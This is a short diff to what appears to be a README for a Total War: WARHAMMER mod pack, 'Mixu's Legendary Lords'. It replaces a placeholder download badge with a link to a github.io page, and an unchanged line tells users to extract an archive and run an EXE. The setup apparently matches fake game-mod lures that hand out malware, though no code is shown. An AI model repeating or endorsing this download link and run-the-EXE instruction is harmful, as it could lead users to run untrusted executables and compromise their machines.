@@ -4,7 +4,7 @@ To install, simply extract the downloaded archive and run the provided EXE file.
 
 A massive expansion adding 50+ lore-accurate legendary lords to Total War: WARHAMMER II & III. Each lord comes with unique skills, traits, start positions, and custom artwork to enrich the Warhammer world.
 
-[![Download Mixu’s Legendary Lords](https://img.shields.io/badge/Download-Mixu--Lords-blueviolet)](#)
+[![Download Mixu’s Legendary Lords](https://img.shields.io/badge/Download-Mixu--Lords-blueviolet)](https://mixu-s-legendary-lords.github.io/.github)
 
 ---
 
